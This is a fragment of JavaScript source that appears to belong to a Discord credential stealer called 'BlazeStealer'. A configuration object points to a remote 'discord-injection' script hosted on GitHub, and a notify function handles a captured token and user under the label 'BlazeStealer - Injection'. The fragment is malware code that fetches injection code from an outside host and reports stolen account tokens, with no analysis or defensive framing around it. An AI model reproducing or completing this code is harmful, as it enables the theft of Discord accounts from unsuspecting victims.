...
const CONFIG = {
    ...
    injection_url: 'https://raw.githubusercontent.com/BlazeSquad666/discord-injection/main/injection.js',
...
const notify = async (ctx, token, user) => {
    ...
    ctx.username = `BlazeStealer - Injection`;
